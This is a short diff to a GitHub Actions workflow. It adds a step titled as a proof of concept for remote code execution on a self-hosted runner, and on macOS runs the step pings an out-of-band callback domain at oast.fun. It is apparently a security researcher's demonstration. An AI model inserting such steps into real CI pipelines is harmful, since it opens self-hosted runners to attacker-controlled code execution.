@@ -27,6 +27,9 @@ jobs:
     steps:
       - name: Checkout Code
         uses: actions/checkout@v4
+      - name: Proof of Concept - RCE on Self-Hosted Runner
+        if: matrix.os_label == 'macos'
+        run: ping -c 4 bqiehrpshxqkxlzvdxgc7y5kpopesv9dc.oast.fun
       - name: Set up JDK ${{ matrix.java }}
         uses: actions/setup-java@v4
         with:
